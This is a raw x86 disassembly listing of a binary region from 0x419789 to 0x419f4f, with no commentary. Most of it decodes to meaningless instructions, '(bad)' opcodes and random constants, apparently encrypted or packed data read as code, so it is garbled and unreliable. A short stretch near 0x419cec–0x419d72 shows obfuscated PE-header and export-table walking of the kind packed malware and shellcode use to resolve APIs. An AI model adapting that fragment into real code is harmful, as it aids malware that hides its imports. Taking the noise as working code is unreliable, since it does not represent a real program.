  419789:	push   edx
  41978a:	add    dl,BYTE PTR [ebp+0xee7f743]
  419790:	push   0xca75f0df
  419795:	icebp  
  419796:	pop    ebx
  419797:	adc    edi,0xb0cc0259
  41979d:	mov    ebx,0x51065a17
  4197a2:	stos   BYTE PTR es:[edi],al
  4197a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197a4:	dec    ebx
  4197a5:	jns    0x419802
  4197a7:	sub    bh,dl
  4197a9:	outs   dx,BYTE PTR ds:[esi]
  4197aa:	sub    DWORD PTR [edx],edi
  4197ac:	mov    ebp,0xb0345fac
  4197b1:	mov    bl,0x69
  4197b3:	cmp    eax,0xf68aa3ff
  4197b8:	xor    ah,BYTE PTR [ebp+0x1]
  4197bb:	fst    QWORD PTR [eax]
  4197bd:	je     0x419820
  4197bf:	xor    ch,BYTE PTR [ebp-0x42]
  4197c2:	pop    ss
  4197c3:	or     al,0xd3
  4197c5:	or     al,0x93
  4197c7:	loopne 0x41978d
  4197c9:	xor    esi,eax
  4197cb:	je     0x4197f4
  4197cd:	scas   al,BYTE PTR es:[edi]
  4197ce:	jg     0x419773
  4197d0:	cmp    DWORD PTR [edi+0x4],esp
  4197d3:	(bad)  
  4197d5:	popa   
  4197d6:	test   BYTE PTR [esi+0x5c10d8a8],dl
  4197dc:	sahf   
  4197dd:	fnsave [edx]
  4197df:	popf   
  4197e0:	imul   esi,DWORD PTR [edx+0x5d468aab],0xe
  4197e7:	pop    edx
  4197e8:	mov    ch,0x37
  4197ea:	(bad)  
  4197ec:	jb     0x41978d
  4197ee:	jmp    0xc62cf32a
  4197f3:	mov    eax,ds:0x503236ef
  4197f8:	mov    BYTE PTR [ebx],dl
  4197fa:	ss in  al,dx
  4197fc:	dec    ebp
  4197fd:	scas   eax,DWORD PTR es:[edi]
  4197fe:	rcl    DWORD PTR [esi+0x70d6f752],cl
  419804:	test   BYTE PTR [ebp-0x3c0ac90a],0xee
  41980b:	mov    al,ds:0x3ea6524d
  419810:	sahf   
  419811:	in     eax,dx
  419812:	xor    bh,BYTE PTR [edi+0x23ff881e]
  419818:	xor    eax,0x5aeb646f
  41981d:	icebp  
  41981e:	fild   DWORD PTR [edx]
  419820:	jecxz  0x419871
  419822:	and    BYTE PTR [ebx-0x43],0xb8
  419826:	es and eax,0x87457ce
  41982c:	loopne 0x41982c
  41982e:	cmp    eax,edx
  419830:	mov    eax,ds:0x44039ce6
  419835:	jae    0x419884
  419837:	sub    al,0xb
  419839:	mov    fs,WORD PTR [edi]
  41983b:	pop    ds
  41983c:	iret   
  41983d:	ret    
  41983e:	sbb    esi,DWORD PTR [ebx-0x20]
  419841:	in     al,dx
  419842:	les    edi,FWORD PTR [edi-0x3260e4c4]
  419848:	jle    0x41988c
  41984a:	cmp    ebp,DWORD PTR [esi]
  41984c:	adc    eax,0xd622f7d8
  419851:	fist   WORD PTR [eax]
  419853:	xchg   DWORD PTR ds:0xcf2509d9,ebp
  419859:	int    0x4f
  41985b:	and    esp,edi
  41985d:	pop    esi
  41985e:	leave  
  41985f:	or     edx,DWORD PTR [ebp+0x5a]
  419862:	add    esp,DWORD PTR [ecx-0x63]
  419865:	push   ebp
  419866:	loopne 0x419804
  419868:	es test al,0xdd
  41986b:	cmc    
  41986c:	mov    BYTE PTR [edx],dh
  41986e:	adc    ah,bl
  419870:	mov    esi,0x43fb8d16
  419875:	xor    DWORD PTR ds:0x3bd47fed,esi
  41987b:	or     ebp,DWORD PTR fs:[esi+0x0]
  41987f:	jns    0x419853
  419881:	push   0x39daca3f
  419886:	fcom   DWORD PTR [edx+0x61f2b33e]
  41988c:	add    DWORD PTR [ebx-0x20],ecx
  41988f:	and    esp,ecx
  419891:	les    edx,FWORD PTR ds:0x3eb8b0fa
  419897:	jmp    0xf212:0xbe8b46a0
  41989e:	iret   
  41989f:	cdq    
  4198a0:	mov    ch,0x8f
  4198a2:	popf   
  4198a3:	pop    edx
  4198a4:	in     al,0x36
  4198a6:	stos   BYTE PTR es:[edi],al
  4198a7:	lahf   
  4198a8:	fsub   DWORD PTR [esp+eax*2-0x67c8e8b2]
  4198af:	dec    esi
  4198b0:	ror    DWORD PTR ds:0x5720fda,cl
  4198b6:	in     eax,dx
  4198b7:	jle    0x419867
  4198b9:	test   DWORD PTR ds:0x8a71b86a,edx
  4198bf:	mov    esi,ds
  4198c1:	pop    ebx
  4198c2:	cmp    al,0x87
  4198c4:	ins    BYTE PTR es:[edi],dx
  4198c5:	push   esi
  4198c6:	mov    bl,0xcc
  4198c8:	xchg   edx,eax
  4198c9:	out    0x73,eax
  4198cb:	(bad)  
  4198cc:	and    BYTE PTR [ecx+0x4c1e73d4],al
  4198d2:	cmp    al,0xd6
  4198d4:	dec    edi
  4198d5:	inc    esp
  4198d6:	cmc    
  4198d7:	push   ebp
  4198d8:	stos   DWORD PTR es:[edi],eax
  4198d9:	mov    esp,0x8121b797
  4198de:	jbe    0x41990d
  4198e0:	popa   
  4198e1:	jmp    0x1e271146
  4198e6:	ret    
  4198e7:	dec    ebx
  4198e8:	aas    
  4198e9:	push   0xffffff9d
  4198eb:	inc    edi
  4198ec:	sub    BYTE PTR [ebx-0x7972e925],cl
  4198f2:	mov    al,0x36
  4198f4:	jb     0x419914
  4198f6:	(bad)  
  4198f7:	mov    ch,0x62
  4198f9:	enter  0x3a50,0x1c
  4198fd:	test   eax,0xf15b957c
  419902:	xchg   ebx,eax
  419903:	inc    edx
  419904:	xchg   ecx,eax
  419905:	mov    ss,WORD PTR [edi+edi*4+0x2c]
  419909:	pop    ebp
  41990a:	sbb    al,BYTE PTR [ebx+0x4]
  41990d:	push   cs
  41990e:	test   al,0x16
  419910:	pusha  
  419911:	dec    edx
  419912:	and    ah,BYTE PTR [ebx]
  419914:	and    DWORD PTR [ebp+0x34],ecx
  419917:	cmp    eax,DWORD PTR [edi]
  419919:	push   cs
  41991a:	loope  0x419958
  41991c:	cmp    ecx,ebp
  41991e:	call   0x5261:0x4667780a
  419925:	push   ss
  419926:	sub    eax,0x574e5bfa
  41992b:	shr    DWORD PTR [ecx-0x34],1
  41992e:	or     eax,0x9b1e2445
  419933:	cmp    eax,edi
  419935:	push   eax
  419936:	mov    esp,edi
  419938:	mov    ebp,eax
  41993a:	dec    ecx
  41993b:	push   esp
  41993c:	cmc    
  41993d:	loopne 0x41999b
  41993f:	xor    DWORD PTR [ebp+0x60],0x7b
  419943:	inc    esp
  419944:	and    ebp,ebx
  419946:	int3   
  419947:	sti    
  419948:	xchg   edi,eax
  419949:	or     BYTE PTR [edi],0xed
  41994c:	pop    ecx
  41994d:	repz and eax,DWORD PTR [ecx+ebp*8-0x7fa123d1]
  419955:	lahf   
  419956:	scas   al,BYTE PTR es:[edi]
  419957:	lods   al,BYTE PTR ds:[esi]
  419958:	shl    BYTE PTR [ecx-0x7dd13316],0x2f
  41995f:	push   ecx
  419960:	lds    esp,FWORD PTR [ebp+eax*4+0x2190299a]
  419967:	arpl   dx,bx
  419969:	push   cs
  41996a:	xchg   esp,eax
  41996b:	xchg   edi,eax
  41996c:	adc    dl,BYTE PTR [edi]
  41996e:	(bad)  [edx-0x6f]
  419971:	xchg   BYTE PTR [ebx],ch
  419973:	fldcw  WORD PTR [ecx-0x69]
  419976:	jmp    0x8960fc29
  41997b:	aam    0x45
  41997d:	in     al,0xb0
  41997f:	fs addr16 std 
  419982:	push   cs
  419983:	inc    ebp
  419984:	pop    ebp
  419985:	pop    edi
  419986:	in     al,dx
  419987:	xor    DWORD PTR [edx-0x68],ebx
  41998a:	fcom   DWORD PTR [edi]
  41998c:	mov    dh,0xc1
  41998e:	sub    al,0x57
  419990:	xor    DWORD PTR [ebx-0x73c55f1],0xffffffe1
  419997:	js     0x419948
  419999:	sbb    dl,BYTE PTR [ebp+0x1c698c78]
  41999f:	xor    BYTE PTR [eax],0xf7
  4199a2:	pop    DWORD PTR [ecx]
  4199a4:	enter  0x5945,0x8e
  4199a8:	rcr    DWORD PTR [edx+0x244ee75f],0x10
  4199af:	jge    0x41995f
  4199b1:	stos   BYTE PTR es:[edi],al
  4199b2:	loop   0x4199b8
  4199b4:	mov    edx,0x36346ec0
  4199b9:	sbb    cl,ah
  4199bb:	mov    dh,0x2d
  4199bd:	loop   0x4199bf
  4199bf:	and    al,0xe2
  4199c1:	into   
  4199c2:	sub    BYTE PTR [eax+0x3d],0x67
  4199c6:	lds    eax,FWORD PTR [ebp+0x78]
  4199c9:	dec    esi
  4199ca:	push   ss
  4199cb:	dec    ebp
  4199cc:	jns    0x419964
  4199ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199cf:	out    dx,eax
  4199d0:	cld    
  4199d1:	hlt    
  4199d2:	sti    
  4199d3:	leave  
  4199d4:	cmc    
  4199d5:	xor    dh,BYTE PTR [esi+0x29ba5339]
  4199db:	mov    dh,0xcf
  4199dd:	hlt    
  4199de:	mov    edx,DWORD PTR ds:0x2fc33042
  4199e4:	es call 0x94fe25a0
  4199ea:	pushf  
  4199eb:	frstor [ebp-0x53103c0b]
  4199f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199f2:	outs   dx,DWORD PTR ds:[esi]
  4199f3:	lahf   
  4199f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f5:	jb     0x419a20
  4199f7:	adc    eax,0xebbb49a5
  4199fc:	push   cs
  4199fd:	dec    ebx
  4199fe:	add    al,0xa6
  419a00:	jbe    0x419a80
  419a02:	aad    0xe6
  419a04:	dec    ebp
  419a05:	mov    BYTE PTR [ecx+0x5e74556f],cl
  419a0b:	pop    ebx
  419a0c:	(bad)  
  419a0e:	jl     0x419a56
  419a10:	pop    edx
  419a11:	mov    ds:0x41f50293,eax
  419a16:	in     al,0x70
  419a18:	mov    BYTE PTR [eax+0x3b],dl
  419a1b:	jmp    0x209c:0x676fcb26
  419a22:	jg     0x4199fa
  419a24:	jnp    0x4199ea
  419a26:	sahf   
  419a27:	sub    esi,DWORD PTR [edi+eax*1+0x27fb388f]
  419a2e:	jg     0x419a81
  419a30:	inc    ebp
  419a31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a32:	fcomp  QWORD PTR [esi]
  419a34:	shl    bl,1
  419a36:	lods   eax,DWORD PTR ds:[esi]
  419a37:	mov    bh,0xb7
  419a39:	iret   
  419a3a:	sbb    DWORD PTR [ebp+0x3a],ebx
  419a3d:	dec    eax
  419a3e:	cmp    ah,BYTE PTR [eax+esi*4]
  419a41:	jns    0x4199f7
  419a43:	jnp    0x419a11
  419a45:	pop    ebp
  419a46:	or     ebp,DWORD PTR [ebp-0x2]
  419a49:	adc    edi,DWORD PTR [ebx+0x47]
  419a4c:	mov    ebp,0x94b7161a
  419a51:	lods   eax,DWORD PTR ds:[esi]
  419a52:	ins    BYTE PTR es:[edi],dx
  419a53:	mov    al,BYTE PTR [edi]
  419a55:	stos   DWORD PTR es:[edi],eax
  419a56:	mov    bl,0xcb
  419a58:	pop    ebp
  419a59:	mov    esp,eax
  419a5b:	cmp    al,0x52
  419a5d:	pop    edi
  419a5e:	cmc    
  419a5f:	or     eax,0xacb5bc6f
  419a64:	add    BYTE PTR [ecx-0x31],bh
  419a67:	pop    DWORD PTR [ecx-0xb]
  419a6a:	lahf   
  419a6b:	pop    edi
  419a6c:	in     al,0x9e
  419a6e:	mov    dh,0xe5
  419a70:	iret   
  419a71:	pop    esp
  419a72:	(bad)  
  419a73:	sub    BYTE PTR [edx],dl
  419a75:	xor    BYTE PTR [edx+ebp*4-0x26ed851b],cl
  419a7c:	xchg   ecx,eax
  419a7d:	scas   al,BYTE PTR es:[edi]
  419a7e:	inc    edi
  419a7f:	fdiv   st,st(3)
  419a81:	mov    ds:0x6215402b,al
  419a86:	jle    0x419a8a
  419a88:	add    al,BYTE PTR [edi-0x3f]
  419a8b:	mul    DWORD PTR ds:0x8ec7539b
  419a91:	imul   esi,DWORD PTR [ecx+0x43],0xffffffae
  419a95:	(bad)  
  419a96:	stos   BYTE PTR es:[edi],al
  419a97:	xor    DWORD PTR [edi],eax
  419a99:	dec    edi
  419a9a:	dec    esi
  419a9b:	push   edx
  419a9c:	imul   ebp,ebp,0xffffffb5
  419a9f:	mov    ebp,0xac29137a
  419aa4:	test   BYTE PTR [edi+0xe890083],bh
  419aaa:	bound  eax,QWORD PTR [ecx+0x3f]
  419aad:	inc    ebx
  419aae:	hlt    
  419aaf:	dec    edi
  419ab0:	sti    
  419ab1:	inc    edi
  419ab2:	and    bl,BYTE PTR ds:0x1a96fa32
  419ab8:	add    BYTE PTR [edi+0x8],bh
  419abb:	inc    ebx
  419abc:	mov    cs,esp
  419abe:	out    dx,eax
  419abf:	test   ch,0x3f
  419ac2:	mov    ecx,0x20801877
  419ac7:	jbe    0x419a4d
  419ac9:	test   al,0x72
  419acb:	inc    edx
  419acc:	(bad)  [ebx]
  419ace:	inc    edx
  419acf:	and    eax,0xb3b7772c
  419ad4:	mov    al,0xbe
  419ad6:	cmp    DWORD PTR [ecx],ebp
  419ad8:	ja     0x419b26
  419ada:	jg     0x419ae4
  419adc:	cmp    dl,BYTE PTR [edi+ebx*4+0x31b3ea5]
  419ae3:	mov    edi,DWORD PTR [esi*2+0x4c753c75]
  419aea:	sbb    eax,0x5655c473
  419aef:	push   edi
  419af0:	push   eax
  419af1:	shl    DWORD PTR [ebx+0x71],1
  419af4:	iret   
  419af5:	cmpxchg esp,edi
  419af8:	jge    0x419b68
  419afa:	and    BYTE PTR [edx-0x1],bl
  419afd:	shr    DWORD PTR [ebp+0x68],1
  419b00:	clc    
  419b01:	mov    edi,ecx
  419b03:	(bad)  
  419b04:	fucomip st,st(0)
  419b06:	push   edi
  419b07:	stos   BYTE PTR es:[edi],al
  419b08:	sbb    eax,0xc8478c32
  419b0d:	shr    BYTE PTR [ecx+0x6dd89d30],0xcc
  419b14:	xchg   DWORD PTR [esi+0xe678bb8],ebp
  419b1a:	dec    edx
  419b1b:	dec    ecx
  419b1c:	and    ecx,edx
  419b1e:	aas    
  419b1f:	in     al,0x3c
  419b21:	or     eax,0x7fc274c0
  419b26:	cmp    DWORD PTR [ebx-0x51],0xc269f70c
  419b2d:	imul   ebx,esi,0xec4bc185
  419b33:	(bad)  
  419b35:	sbb    DWORD PTR [ecx-0x45],esi
  419b38:	mov    edi,0x8271e460
  419b3d:	jmp    0xa328:0x4b72fa1e
  419b44:	sbb    BYTE PTR [ebp+0x1899d3c3],bh
  419b4a:	or     eax,0x5a08c180
  419b4f:	sbb    ebp,ebp
  419b51:	mov    ah,0xfb
  419b53:	sub    bl,BYTE PTR ds:0x208af158
  419b59:	retf   
  419b5a:	(bad)  
  419b5b:	scas   al,BYTE PTR es:[edi]
  419b5c:	lea    esp,[ebp+0x7f286d04]
  419b62:	inc    edx
  419b63:	(bad)  
  419b64:	jne    0x419b5b
  419b66:	xchg   esp,eax
  419b67:	ret    
  419b68:	je     0x419b1e
  419b6a:	out    0xbb,eax
  419b6c:	jecxz  0x419b41
  419b6e:	addr16 sub eax,0xc30cdece
  419b74:	outs   dx,BYTE PTR ds:[esi]
  419b75:	pop    edi
  419b76:	arpl   WORD PTR [eax-0x7fe73797],bp
  419b7c:	test   eax,0x9759a9b5
  419b81:	and    ah,BYTE PTR [ebx-0x34]
  419b84:	out    dx,eax
  419b85:	ret    0x7755
  419b88:	push   es
  419b89:	daa    
  419b8a:	sub    al,0x26
  419b8c:	sahf   
  419b8d:	cmp    eax,0xf9673c50
  419b92:	xchg   ecx,eax
  419b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b94:	sar    bh,1
  419b96:	add    eax,0xb99677da
  419b9b:	aad    0x96
  419b9d:	inc    ebx
  419b9e:	imul   ebp,DWORD PTR [ebp+0x4f412360],0x88d7b113
  419ba8:	ds fsubp st(1),st
  419bab:	in     eax,0x34
  419bad:	cli    
  419bae:	pop    ds
  419baf:	jmp    0x419bb5
  419bb1:	sub    cl,BYTE PTR [edx-0x6f761775]
  419bb7:	jbe    0x419bcc
  419bb9:	repz push esp
  419bbb:	add    ecx,0x873676a6
  419bc1:	ret    
  419bc2:	(bad)  
  419bc3:	cmc    
  419bc4:	pop    eax
  419bc5:	sar    DWORD PTR [edi-0x32a552da],cl
  419bcb:	cmp    BYTE PTR [edx-0x3c411f21],dl
  419bd1:	clc    
  419bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd3:	dec    ebx
  419bd4:	dec    esp
  419bd5:	push   edi
  419bd6:	or     DWORD PTR [ebx-0xfe2f90f],ebp
  419bdc:	loope  0x419baf
  419bde:	lds    edi,FWORD PTR [ecx+0x7b]
  419be1:	pop    ds
  419be2:	out    dx,eax
  419be3:	sub    eax,0x44ace56e
  419be8:	nop
  419be9:	(bad)  
  419bea:	aad    0x4c
  419bec:	div    BYTE PTR [eax+0x15]
  419bef:	push   0x6c
  419bf1:	jg     0x419beb
  419bf3:	inc    ecx
  419bf4:	mov    esi,0xba5a7126
  419bf9:	push   ebp
  419bfa:	dec    ecx
  419bfb:	or     eax,0x7071697b
  419c00:	push   cs
  419c01:	jns    0x419b99
  419c03:	cmp    cl,al
  419c05:	pusha  
  419c06:	arpl   WORD PTR [edi],dx
  419c08:	push   esi
  419c09:	jbe    0x419c0b
  419c0b:	in     eax,dx
  419c0c:	sub    al,0x3e
  419c0e:	scas   al,BYTE PTR es:[edi]
  419c0f:	push   edx
  419c10:	jns    0x419c3a
  419c12:	mov    dh,0x67
  419c14:	cmc    
  419c15:	das    
  419c16:	inc    esi
  419c17:	or     dl,BYTE PTR [ebx+0x3e]
  419c1a:	xor    al,0x74
  419c1c:	jmp    0x6c58:0xbdc1fe38
  419c23:	or     eax,0x30d504fd
  419c28:	daa    
  419c29:	mov    ds:0x3e76798a,eax
  419c2e:	push   esi
  419c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c30:	stc    
  419c31:	std    
  419c32:	xor    eax,0xf809a42b
  419c37:	xchg   ebp,eax
  419c38:	shl    DWORD PTR [ebp-0x57],1
  419c3b:	and    DWORD PTR [edi+0x6f],ebx
  419c3e:	push   ebx
  419c3f:	jnp    0x419bc7
  419c41:	popa   
  419c42:	add    esp,DWORD PTR [edi-0x7980c45]
  419c48:	pop    edx
  419c49:	inc    ebx
  419c4a:	dec    esp
  419c4b:	push   ss
  419c4c:	add    al,0x76
  419c4e:	mov    esp,0xb9339837
  419c54:	push   ebx
  419c55:	lahf   
  419c56:	loope  0x419c53
  419c58:	cld    
  419c59:	pusha  
  419c5a:	or     eax,0x2538b988
  419c5f:	aad    0x79
  419c61:	jnp    0x419c53
  419c63:	mov    eax,0x66f5b704
  419c68:	mov    ecx,0x8f0e4564
  419c6d:	adc    eax,0xd7715d71
  419c72:	adc    DWORD PTR [ecx+0x4e004a86],ecx
  419c78:	cmp    BYTE PTR [eax],bh
  419c7a:	pop    ecx
  419c7b:	clc    
  419c7c:	mov    ecx,?
  419c7e:	fiadd  WORD PTR [ecx]
  419c80:	pop    eax
  419c81:	cmp    BYTE PTR [ebx+0x74],0x57
  419c85:	mov    esp,0x23c0bede
  419c8a:	ins    DWORD PTR es:[edi],dx
  419c8b:	mov    dh,0x7b
  419c8d:	out    dx,eax
  419c8e:	xlat   BYTE PTR ds:[ebx]
  419c8f:	retf   0xd5a6
  419c92:	das    
  419c93:	popa   
  419c94:	ret    
  419c95:	pusha  
  419c96:	sbb    al,0xf
  419c98:	sbb    dl,BYTE PTR [edi+0x1a]
  419c9b:	retf   
  419c9c:	enter  0x4dd8,0xef
  419ca0:	mov    ch,0xf7
  419ca2:	in     al,0x45
  419ca4:	mov    al,0xe6
  419ca6:	outs   dx,BYTE PTR ds:[esi]
  419ca7:	jbe    0x419cfd
  419ca9:	push   esi
  419caa:	popf   
  419cab:	nop
  419cac:	out    dx,eax
  419cad:	dec    ebp
  419cae:	push   es
  419caf:	inc    esi
  419cb0:	jbe    0x419cf2
  419cb2:	lods   eax,DWORD PTR ds:[esi]
  419cb3:	sub    DWORD PTR [eax],esp
  419cb5:	xor    eax,DWORD PTR es:[ebp-0x74]
  419cb9:	push   0xffffffc9
  419cbb:	cmp    al,0xd8
  419cbd:	pop    ebx
  419cbe:	xchg   BYTE PTR [edx-0x162cb0d4],bl
  419cc4:	fcomp  QWORD PTR [edi]
  419cc6:	cmc    
  419cc7:	enter  0x642f,0x95
  419ccb:	inc    esi
  419ccc:	mov    eax,0xed28ffb3
  419cd1:	adc    bh,dh
  419cd3:	mov    dl,0x79
  419cd5:	lods   eax,DWORD PTR ds:[esi]
  419cd6:	rcr    BYTE PTR [ecx+0x1f9b4398],1
  419cdc:	inc    esi
  419cdd:	mov    ecx,esi
  419cdf:	shl    esp,1
  419ce1:	xor    eax,0xd213ecb5
  419ce6:	inc    edx
  419ce7:	xchg   esp,eax
  419ce8:	pusha  
  419ce9:	in     eax,dx
  419cea:	dec    eax
  419ceb:	push   esp
  419cec:	mov    ebx,DWORD PTR [ebp-0x28]
  419cef:	mov    edi,DWORD PTR [ebp-0x24]
  419cf2:	and    eax,esi
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	hlt    
  419d84:	gs xor al,0xc8
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x56bd192c
  419d90:	ds push es
  419d92:	ss adc al,0x77
  419d95:	mov    ecx,edx
  419d97:	jge    0x419d1e
  419d99:	jmp    0x419d67
  419d9b:	fisub  DWORD PTR ds:0xf2243b82
  419da1:	lea    ecx,[ebx-0x1b]
  419da4:	mov    ds:0x72078807,eax
  419da9:	and    cl,BYTE PTR [ecx-0x2e]
  419dac:	aaa    
  419dad:	cmp    BYTE PTR [esi-0x8247c9f],cl
  419db3:	sub    ecx,0x14
  419db6:	push   0xffffff94
  419db8:	jo     0x419e00
  419dba:	add    al,0xd6
  419dbc:	in     eax,0xf7
  419dbe:	outs   dx,DWORD PTR ds:[esi]
  419dbf:	out    dx,al
  419dc0:	push   esp
  419dc1:	mov    ebx,0x53ca3bf9
  419dc6:	sar    edi,1
  419dc8:	stc    
  419dc9:	pushf  
  419dca:	and    esi,DWORD PTR [edi-0x20ff8556]
  419dd0:	xchg   ebx,eax
  419dd1:	inc    edx
  419dd2:	mov    WORD PTR [ebx+0x4f],ss
  419dd5:	sbb    ch,BYTE PTR [eax+0x596501f5]
  419ddb:	call   0x1370341
  419de0:	pushf  
  419de1:	sub    eax,0xd39953dd
  419de6:	dec    ecx
  419de7:	adc    al,0xd0
  419de9:	(bad)  
  419deb:	fild   WORD PTR [esi+0x6c]
  419dee:	jbe    0x419e08
  419df0:	leave  
  419df1:	or     eax,edi
  419df3:	mov    DWORD PTR [eax],ebp
  419df5:	int    0x33
  419df7:	jae    0x419e6b
  419df9:	lods   al,BYTE PTR ds:[esi]
  419dfa:	dec    edx
  419dfb:	shl    cl,0x1c
  419dfe:	into   
  419dff:	xor    BYTE PTR [ecx-0x6a],bl
  419e02:	pop    ax
  419e04:	dec    ecx
  419e05:	aas    
  419e06:	aad    0x50
  419e08:	jns    0x419e3c
  419e0a:	xor    al,0x98
  419e0c:	adc    BYTE PTR [ebp+0x5d58f226],dl
  419e12:	ret    
  419e13:	mov    edi,0x71a241c
  419e18:	aad    0x79
  419e1a:	fsub   st(1),st
  419e1c:	(bad)  
  419e1d:	xlat   BYTE PTR ds:[ebx]
  419e1e:	pop    esp
  419e1f:	pop    ebx
  419e20:	dec    eax
  419e21:	xchg   edi,eax
  419e22:	push   ebx
  419e23:	lods   eax,DWORD PTR ds:[esi]
  419e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e25:	xchg   esi,eax
  419e26:	imul   esi
  419e28:	fadd   QWORD PTR [ebx-0x3547d1d0]
  419e2e:	fcmovnu st,st(4)
  419e30:	out    dx,eax
  419e31:	push   0xffffffda
  419e33:	mov    ecx,0xc3275ce7
  419e38:	aam    0xd5
  419e3a:	mov    ss,WORD PTR [ebx-0xc]
  419e3d:	in     al,dx
  419e3e:	cmp    BYTE PTR [ecx-0x61c809d9],al
  419e44:	mov    edi,0x44ce16d7
  419e49:	add    dl,BYTE PTR [ebp+0x264b6fc5]
  419e4f:	jp     0x419ec6
  419e51:	mov    BYTE PTR [ebx+0x76f2bbd2],ch
  419e57:	push   cs
  419e58:	aaa    
  419e59:	cs (bad) 
  419e5c:	arpl   cx,bx
  419e5e:	ins    BYTE PTR es:[edi],dx
  419e5f:	popf   
  419e60:	dec    esp
  419e61:	ins    BYTE PTR es:[edi],dx
  419e62:	maxps  xmm6,XMMWORD PTR [eax]
  419e65:	loopne 0x419e8a
  419e67:	or     al,0x80
  419e69:	test   ch,cl
  419e6b:	adc    BYTE PTR [edx+0x6d],dh
  419e6e:	test   BYTE PTR [edx],cl
  419e70:	jg     0x419eec
  419e72:	jb     0x419e37
  419e74:	mov    ch,0x9f
  419e76:	push   0x30
  419e78:	sub    eax,0xeee5457e
  419e7d:	loope  0x419e70
  419e7f:	pop    edx
  419e80:	or     BYTE PTR [edi],bh
  419e82:	sub    al,0x71
  419e84:	imul   ebx,DWORD PTR [edi-0xd],0xa4f6301
  419e8b:	sub    ebx,DWORD PTR [eax+esi*2-0x60]
  419e8f:	(bad)
  419e92:	xchg   esi,eax
  419e93:	push   esi
  419e94:	sub    al,0xa3
  419e96:	and    esp,DWORD PTR [eax]
  419e98:	bound  ebx,QWORD PTR [esi-0x7c357e40]
  419e9e:	in     al,dx
  419e9f:	jno    0xbee737b8
  419ea5:	mov    ebx,0x49d8fdc
  419eaa:	gs add al,0xcc
  419ead:	and    eax,0xd1706707
  419eb2:	push   es
  419eb3:	int    0x89
  419eb5:	sti    
  419eb6:	les    eax,FWORD PTR [ebp+0x43]
  419eb9:	mov    ch,0xd2
  419ebb:	push   edi
  419ebc:	jbe    0x419e62
  419ebe:	punpcklbw mm7,DWORD PTR [ebx]
  419ec1:	jle    0x419f40
  419ec3:	scas   eax,DWORD PTR es:[edi]
  419ec4:	rcl    BYTE PTR [esp+eax*8],0x90
  419ec8:	in     al,0x24
  419eca:	out    dx,al
  419ecb:	(bad)  
  419ecc:	lods   eax,DWORD PTR ds:[esi]
  419ecd:	out    dx,al
  419ece:	shr    cl,cl
  419ed0:	push   esp
  419ed1:	inc    esp
  419ed2:	or     eax,0xd70fd466
  419ed7:	jecxz  0x419f57
  419ed9:	adc    al,BYTE PTR [edi-0x1e]
  419edc:	inc    ebp
  419edd:	and    al,0xd3
  419edf:	push   ecx
  419ee0:	retf   
  419ee1:	hlt    
  419ee2:	inc    ecx
  419ee3:	or     eax,0x8844e36c
  419ee8:	(bad)
  419eeb:	xor    eax,0x4467035f
  419ef0:	pop    ecx
  419ef1:	lods   eax,DWORD PTR ds:[esi]
  419ef2:	(bad)  
  419ef3:	fsqrt  
  419ef5:	cs inc edx
  419ef7:	loop   0x419f52
  419ef9:	mov    BYTE PTR [edi*4+0x4aacab03],0xf4
  419f01:	sbb    eax,0xe8abb76a
  419f06:	mov    al,ds:0xbb1d03f
  419f0b:	jae    0x419ec9
  419f0d:	push   edx
  419f0e:	xlat   BYTE PTR ds:[ebx]
  419f0f:	sbb    eax,0x9f101513
  419f14:	mov    ebp,0xd10f3851
  419f19:	stos   BYTE PTR es:[edi],al
  419f1a:	sub    al,0x81
  419f1c:	je     0x419f96
  419f1e:	fwait
  419f1f:	cmp    eax,0x2ef34135
  419f24:	lods   eax,DWORD PTR ds:[esi]
  419f25:	imul   ebx,eax,0xfffffffe
  419f28:	pop    ebp
  419f29:	sti    
  419f2a:	xor    DWORD PTR [esi-0x76],ebx
  419f2d:	push   0x91cb7905
  419f32:	xor    eax,0x853fba15
  419f37:	aaa    
  419f38:	nop
  419f39:	adc    DWORD PTR [ecx],edx
  419f3b:	inc    esp
  419f3c:	test   DWORD PTR [eax+0x47],0xc98136f5
  419f43:	repnz into 
  419f45:	cmp    esp,edi
  419f47:	push   es
  419f48:	mov    eax,gs
  419f4a:	ss enter 0xc35,0x3e
  419f4f:	stos   BYTE PTR es:[edi],al
